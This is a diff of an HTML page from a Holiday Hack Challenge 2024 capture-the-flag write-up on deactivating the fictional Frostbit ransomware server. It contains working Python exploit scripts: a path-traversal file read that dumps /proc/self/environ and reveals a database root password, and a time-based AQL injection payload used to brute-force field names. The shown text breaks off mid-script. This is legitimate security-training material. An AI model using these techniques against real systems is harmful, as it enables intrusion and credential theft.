@@ -27,19 +27,19 @@ Hints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware 
 Hints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware server’s data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details.">
     <meta itemprop="datePublished" content="2024-12-14T14:54:27+01:00">
     <meta itemprop="dateModified" content="2024-12-14T14:54:27+01:00">
-    <meta itemprop="wordCount" content="404">
+    <meta itemprop="wordCount" content="1256">
     <title>Elf Frostbit Deactivate - HHC 2024</title>
-    <link href="/images/logo.png?1734966427" rel="icon" type="image/png">
-    <link href="/css/fontawesome-all.min.css?1734966427" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1734966427" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1734966427" rel="stylesheet">
-    <link href="/css/auto-complete.css?1734966427" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1734966427" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1734966427" rel="stylesheet">
-    <link href="/css/fonts.css?1734966427" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1734966427" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1734966427" rel="stylesheet">
-    <link href="/css/theme-christmas.css?1734966427" rel="stylesheet" id="R-variant-style">
-    <link href="/css/chroma-relearn-light.css?1734966427" rel="stylesheet" id="R-variant-chroma-style">
-    <link href="/css/print.css?1734966427" rel="stylesheet" media="print">
-    <script src="/js/variant.js?1734966427"></script>
+    <link href="/images/logo.png?1735157138" rel="icon" type="image/png">
+    <link href="/css/fontawesome-all.min.css?1735157138" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1735157138" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1735157138" rel="stylesheet">
+    <link href="/css/auto-complete.css?1735157138" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1735157138" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1735157138" rel="stylesheet">
+    <link href="/css/fonts.css?1735157138" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1735157138" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1735157138" rel="stylesheet">
+    <link href="/css/theme-christmas.css?1735157138" rel="stylesheet" id="R-variant-style">
+    <link href="/css/chroma-relearn-light.css?1735157138" rel="stylesheet" id="R-variant-chroma-style">
+    <link href="/css/print.css?1735157138" rel="stylesheet" media="print">
+    <script src="/js/variant.js?1735157138"></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.relBasePath='..\/..';
@@ -75,11 +75,16 @@ Hints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware 
 <nav class="TableOfContents">
   <ul>
     <li><a href="#objective">Objective</a></li>
-    <li><a href="#hints">Hints</a></li>
+    <li><a href="#hints">Hints</a>
+      <ul>
+        <li><a href="#note">Note</a></li>
+      </ul>
+    </li>
     <li><a href="#solution">Solution</a>
       <ul>
         <li><a href="#gold">Gold</a></li>
         <li><a href="#overview-of-keywords-allowed-or-blocked">Overview of keywords allowed or blocked</a></li>
+        <li><a href="#digging-deeper-into-the-abyss">Digging deeper into the abyss</a></li>
       </ul>
     </li>
   </ul>
@@ -135,30 +140,32 @@ Hints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware 
 </tr>
 </tbody>
 </table>
+<h3 id="note">Note</h3>
+<p>Had to rededownload the artefacts anew due to the timer on the ransomware note page timed out. References to ids and such might differ from here on from time to time.</p>
 <h2 id="solution">Solution</h2>
 <h3 id="gold">Gold</h3>
 <p>From other objectives I have already found the deactivation endpoint:</p>
-<p><a href="#R-image-0aa2213b7eac2b2ce2b3c1d245c911b1" class="lightbox-link"><img alt="Deactivation endpoint" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-0aa2213b7eac2b2ce2b3c1d245c911b1"><img alt="Deactivation endpoint" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png"></a></p>
+<p><a href="#R-image-ab49fa3945b96d6935301dd61920a822" class="lightbox-link"><img alt="Deactivation endpoint" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-ab49fa3945b96d6935301dd61920a822"><img alt="Deactivation endpoint" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png"></a></p>
 <p>For clarity:</p>
 <div class="highlight wrap-code"><pre tabindex="0"><code>/api/v1/frostbitadmin/bot/&lt;botuuid&gt;/deactivate</code></pre></div>
 <p>It appears to requiring &ldquo;authHeader: X-API-Key&rdquo; set.</p>
 <p>Looking at what HTTP verbs the endpoint support I see:</p>
-<p><a href="#R-image-bfa66755aef89c238cb3dd33b24bbe1d" class="lightbox-link"><img alt="Supported HTTP verbs" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-1.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-bfa66755aef89c238cb3dd33b24bbe1d"><img alt="Supported HTTP verbs" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-1.png"></a></p>
+<p><a href="#R-image-7ead50da11ad87e02303dabd6f3a2032" class="lightbox-link"><img alt="Supported HTTP verbs" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-1.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-7ead50da11ad87e02303dabd6f3a2032"><img alt="Supported HTTP verbs" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-1.png"></a></p>
 <ul>
 <li>GET</li>
 <li>HEAD</li>
 <li>OPTIONS</li>
 </ul>
 <p>The tip mentions that the infratructure may reveal something about itself, let&rsquo;s try the debug trick from earlier objectives:</p>
-<p><a href="#R-image-9d329c966d7f50f6554cb95adfa42853" class="lightbox-link"><img alt="Debug mode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-2.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-9d329c966d7f50f6554cb95adfa42853"><img alt="Debug mode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-2.png"></a></p>
+<p><a href="#R-image-4c6a4d3fcf0d6f132b73880f45442d31" class="lightbox-link"><img alt="Debug mode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-2.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-4c6a4d3fcf0d6f132b73880f45442d31"><img alt="Debug mode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-2.png"></a></p>
 <p>For clarity, here&rsquo;s the output:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;debug&#34;</span>:<span style="color:#66d9ef">true</span>,<span style="color:#f92672">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;Timeout or error in query:\nFOR doc IN config\n    FILTER doc.&lt;key_name_omitted&gt; == &#39;{user_supplied_x_api_key}&#39;\n    &lt;other_query_lines_omitted&gt;\n    RETURN doc&#34;</span>}</span></span></code></pre></div>
 <p>This query language looks like ArangoDB, and ChatGPT think that as well. There&rsquo;s a mention of &ldquo;user_supplied_x_api_key&rdquo;. Let&rsquo;s see if I can trigger something by manipulating it:</p>
-<p><a href="#R-image-953454b5670214560f9b610a3c64390b" class="lightbox-link"><img alt="Debug mode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-3.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-953454b5670214560f9b610a3c64390b"><img alt="Debug mode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-3.png"></a></p>
+<p><a href="#R-image-aec775695c0429d05bfc58bc0dd95dd1" class="lightbox-link"><img alt="Debug mode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-3.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-aec775695c0429d05bfc58bc0dd95dd1"><img alt="Debug mode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-deactivate-3.png"></a></p>
 <p>For clarity, here&rsquo;s the output:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;debug&#34;</span>:<span style="color:#66d9ef">true</span>,<span style="color:#f92672">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;Invalid Key&#34;</span>}</span></span></code></pre></div>
 <p>Setting header field:</p>
@@ -166,278 +173,326 @@ Hints From Hint Dusty Giftwrap There must be a way to deactivate the ransomware 
 <p>Yields this error:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;debug&#34;</span>:<span style="color:#66d9ef">true</span>,<span style="color:#f92672">&#34;error&#34;</span>:<span style="color:#e6db74">&#34;Request Blocked&#34;</span>}</span></span></code></pre></div>
 <h3 id="overview-of-keywords-allowed-or-blocked">Overview of keywords allowed or blocked</h3>
-<p>It appears that certain keywords are blocked, trying to map them out (according to <a href="https://docs.arangodb.com/stable/aql/fundamentals/syntax/)" rel="external" target="_blank">https://docs.arangodb.com/stable/aql/fundamentals/syntax/)</a>:</p>
+<p>It appears that certain keywords are blocked, trying to map them out ( according to <a href="https://docs.arangodb.com/stable/aql/fundamentals/syntax/" rel="external" target="_blank">https://docs.arangodb.com/stable/aql/fundamentals/syntax/</a> ):</p>
 <table>
 <thead>
 <tr>
 <th>Keyword</th>
-<th>Blocked</th>
-<th>Open</th>
+<th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>AGGREGATE</td>
-<td></td>
-<td>X</td>
+<td>Performs an aggregation operation over a set of documents.</td>
 </tr>
 <tr>
 <td>ALL</td>
-<td></td>
-<td>X</td>
+<td>Used to check if all elements in a collection or array meet a condition.</td>
 </tr>
 <tr>
 <td>ALL_SHORTEST_PATHS</td>
-<td></td>
-<td>X</td>
+<td>Computes all shortest paths between two nodes in a graph.</td>
 </tr>
 <tr>
 <td>AND</td>
-<td></td>
-<td>X</td>
+<td>Logical operator used to combine two conditions.</td>
 </tr>
 <tr>
 <td>ANY</td>
-<td></td>
-<td>X</td>
+<td>Returns a single element that satisfies a condition from an array.</td>
 </tr>
 <tr>
 <td>ASC</td>
-<td></td>
-<td>X</td>
+<td>Sorts results in ascending order.</td>
 </tr>
 <tr>
 <td>COLLECT</td>
-<td></td>
-<td>X</td>
+<td>Groups results and aggregates them into a single result set.</td>
 </tr>
 <tr>
 <td>DESC</td>
-<td></td>
-<td>X</td>
+<td>Sorts results in descending order.</td>
 </tr>
 <tr>
 <td>DISTINCT</td>
-<td></td>
-<td>X</td>
+<td>Removes duplicate results from the query result.</td>
 </tr>
 <tr>
 <td>FALSE</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>FILTER</td>
-<td>X</td>
-<td></td>
-</tr>
-<tr>
-<td>FOR</td>
-<td>X</td>
-<td></td>
+<td>Boolean literal representing a false value.</td>
 </tr>
 <tr>
 <td>GRAPH</td>
-<td></td>
-<td>X</td>
+<td>Refers to a graph in ArangoDB, typically used in graph queries.</td>
 </tr>
 <tr>
 <td>IN</td>
-<td></td>
-<td>X</td>
+<td>Checks if a value is contained within a set, array, or collection.</td>
 </tr>
 <tr>
 <td>INBOUND</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>INSERT</td>
-<td>X</td>
-<td></td>
+<td>Refers to inbound edges in a graph traversal.</td>
 </tr>
 <tr>
 <td>INTO</td>
-<td></td>
-<td>X</td>
+<td>Used to insert the result of a query into a new or existing collection.</td>
 </tr>
 <tr>
 <td>K_PATHS</td>
-<td></td>
-<td>X</td>
+<td>Computes the k paths between two nodes in a graph.</td>
 </tr>
 <tr>
 <td>K_SHORTEST_PATHS</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>LET</td>
-<td>X</td>
-<td></td>
+<td>Computes the k shortest paths between two nodes in a graph.</td>
 </tr>
 <tr>
 <td>LIKE</td>
-<td></td>
-<td>X</td>
+<td>Performs pattern matching on strings, similar to SQL&rsquo;s LIKE.</td>
 </tr>
 <tr>
 <td>LIMIT</td>
-<td></td>
-<td>X</td>
+<td>Restricts the number of results returned by a query.</td>
 </tr>
 <tr>
 <td>NONE</td>
-<td></td>
-<td>X</td>
+<td>Represents an empty set or the negation of a condition.</td>
 </tr>
 <tr>
 <td>NOT</td>
-<td></td>
-<td>X</td>
+<td>Logical negation operator, used to negate a condition.</td>
 </tr>
 <tr>
 <td>NULL</td>
-<td></td>
-<td>X</td>
+<td>Represents a null value.</td>
 </tr>
 <tr>
 <td>OR</td>
-<td></td>
-<td>X</td>
+<td>Logical operator used to combine two conditions.</td>
 </tr>
 <tr>
 <td>OUTBOUND</td>
-<td></td>
-<td>X</td>
+<td>Refers to outbound edges in a graph traversal.</td>
 </tr>
 <tr>
 <td>REMOVE</td>
-<td></td>
-<td>X</td>
+<td>Deletes documents from a collection.</td>
 </tr>
 <tr>
 <td>REPLACE</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>RETURN</td>
-<td>X</td>
-<td></td>
+<td>Replaces an existing document in a collection with a new one.</td>
 </tr>
 <tr>
 <td>SHORTEST_PATH</td>
-<td></td>
-<td>X</td>
+<td>Computes the shortest path between two nodes in a graph.</td>
 </tr>
 <tr>
 <td>SORT</td>
-<td></td>
-<td>X</td>
+<td>Sorts results by one or more fields.</td>
 </tr>
 <tr>
 <td>TRUE</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>UPDATE</td>
-<td>X</td>
-<td></td>
+<td>Boolean literal representing a true value.</td>
 </tr>
 <tr>
 <td>UPSERT</td>
-<td></td>
-<td>X</td>
+<td>Inserts a document if it doesn&rsquo;t exist, or updates it if it does.</td>
 </tr>
 <tr>
 <td>WINDOW</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>WITH</td>
-<td>X</td>
-<td></td>
-</tr>
-<tr>
-<td>FOR</td>
-<td>X</td>
-<td></td>
-</tr>
-<tr>
-<td>RETURN</td>
-<td>X</td>
-<td></td>
-</tr>
-<tr>
-<td>FILTER</td>
-<td>X</td>
-<td></td>
+<td>Used to define a subset of documents, typically for analysis.</td>
 </tr>
 <tr>
 <td>SEARCH</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>SORT</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>LIMIT</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>LET</td>
-<td>X</td>
-<td></td>
-</tr>
-<tr>
-<td>COLLECT</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>WINDOW</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>INSERT</td>
-<td>X</td>
-<td></td>
-</tr>
-<tr>
-<td>UPDATE</td>
-<td>X</td>
-<td></td>
-</tr>
-<tr>
-<td>REPLACE</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>REMOVE</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>UPSERT</td>
-<td></td>
-<td>X</td>
-</tr>
-<tr>
-<td>WITH</td>
-<td>X</td>
-<td></td>
+<td>Searches for documents or patterns in collections.</td>
 </tr>
 </tbody>
 </table>
+<h3 id="digging-deeper-into-the-abyss">Digging deeper into the abyss</h3>
+<p>I know the backend is running ArangDB. On this stage I thought I could be lucky exploiting the LFI from &ldquo;encryption&rdquo; challenge to obtain more information. I customized the Python script I used to calculate the LFI URL to take into account user input:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>botid <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;9acf5a6b-52ff-43a5-b06f-1d1232d1cbef&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nonce <span style="color:#f92672">=</span> bytes([
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x56</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xee</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x28</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x37</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x27</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8f</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x66</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x34</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x56</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xee</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x28</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x37</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x27</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x8f</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x66</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x34</span>
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nonce_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%25&#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>byte<span style="color:#e6db74">:</span><span style="color:#e6db74">02x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> nonce)
+</span></span><span style="display:flex;"><span>separator <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(<span style="color:#e6db74">&#34;/&#34;</span>))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;%25</span><span style="color:#e6db74">{</span>nonce_string<span style="color:#e6db74">}{</span>separator<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filepath <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Path to obtain: &#34;</span>)
+</span></span><span style="display:flex;"><span>filepath_enc <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(filepath))
+</span></span><span style="display:flex;"><span>target_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://api.frostbit.app/view/</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">..%252F..%252F..%252F..%252F..</span><span style="color:#e6db74">{</span>filepath_enc<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>botid<span style="color:#e6db74">}</span><span style="color:#e6db74">/status?debug=1&amp;digest=00000000000000000000000000000000&#34;</span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(target_url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Url with payload&#34;</span>)
+</span></span><span style="display:flex;"><span>print(target_url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Regex pattern to extract the value of debugData</span>
+</span></span><span style="display:flex;"><span>pattern <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;const debugData = &#34;(.*?)&#34;;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Search for the debugData value</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(pattern, res<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">File content </span><span style="color:#e6db74">{</span>filepath<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#66d9ef">match</span><span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))</span></span></code></pre></div>
+<p>Interested in finding out what&rsquo;s on the path I looked into <code>/proc/self/environ</code> using this script. This was the output:</p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>└─$ python test.py
+Path to obtain: /proc/self/environ
+Url with payload
+https://api.frostbit.app/view/%2556%25ee%2528%2537%2527%258f%2566%2534%2556%25ee%2528%2537%2527%258f%2566%2534%252F..%252F..%252F..%252F..%252F..%252Fproc%252Fself%252Fenviron/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/status?debug=1&amp;digest=00000000000000000000000000000000
+
+File content /proc/self/environ:
+
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=6059e5d8ecc8FROSTBIT_CHALLENGE_HASH=6487b8b081bc4317cc8017a898c7dfc8LETSENCRYPT_EMAIL=ops@counterhack.comPYTHONUNBUFFERED=1VIRTUAL_PORT=8080ARANGO_ROOT_PASSWORD=passwordARANGO_HOST=arangodbAPP_DEBUG=trueAPI_ENDPOINT=https://2024.holidayhackchallenge.comVIRTUAL_HOST=api.frostbit.appLETSENCRYPT_HOST=api.frostbit.appLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568PYTHON_VERSION=3.9.19PYTHON_PIP_VERSION=23.0.1PYTHON_SETUPTOOLS_VERSION=58.1.0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/def4aec84b261b939137dd1c69eff0aabb4a7bf4/public/get-pip.pyPYTHON_GET_PIP_SHA256=bc37786ec99618416cc0a0ca32833da447f4d91ab51d2c138dd15b7af21e8e9aHOME=/root</code></pre></div>
+<p>We now know the password for this database server:</p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>ARANGO_ROOT_PASSWORD=passwordARANGO_HOST=arangodb</code></pre></div>
+<p>Solution, created a Jupyter Notebook to work in.</p>
+<h4 id="jupyter-notebook">Jupyter Notebook</h4>
+<h5 id="part-one---identifying-letters-used-in-fieldnames-in-arangodb-documents">Part one - identifying letters used in fieldnames in ArangoDB documents</h5>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase)
+</span></span><span style="display:flex;"><span>characters<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;_&#34;</span>)
+</span></span><span style="display:flex;"><span>characters<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;|&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">identify_letters</span>(needle):
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;https://api.frostbit.app/api/v1/frostbitadmin/bot/9acf5a6b-52ff-43a5-b06f-1d1232d1cbef/deactivate?debug=1&#34;</span>,
+</span></span><span style="display:flex;"><span>        headers<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;X-Api-Key&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; OR CONTAINS(CONCAT_SEPARATOR(&#39;|&#39;, ATTRIBUTES(doc)), &#39;</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) OR sleep(5) OR &#39;1&#39;==&#39;0&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> res<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>found_letters <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> characters:
+</span></span><span style="display:flex;"><span>    time_taken <span style="color:#f92672">=</span> identify_letters(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> time_taken <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>: 
+</span></span><span style="display:flex;"><span>        found_letters<span style="color:#f92672">.</span>append(c)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>found_letters</span></span></code></pre></div>
+<p>Outputs:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[<span style="color:#960050;background-color:#1e0010">&#39;a&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;c&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;d&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;e&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;i&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;k&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;p&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;r&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;t&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;v&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;y&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;_&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;|&#39;</span>]</span></span></code></pre></div>
+<h5 id="part-two---identify-fieldnames">Part two - identify fieldnames</h5>
+<p>Having the characters used in the fieldnames, I could simply bruteforce my way to find which names was in use:</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">identify_keys</span>(needle):
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#39; OR CONTAINS(CONCAT_SEPARATOR(&#39;|&#39;, ATTRIBUTES(doc)), &#39;</span><span style="color:#e6db74">{</span>needle<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;) OR sleep(5) OR &#39;1&#39;==&#39;0&#34;</span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(
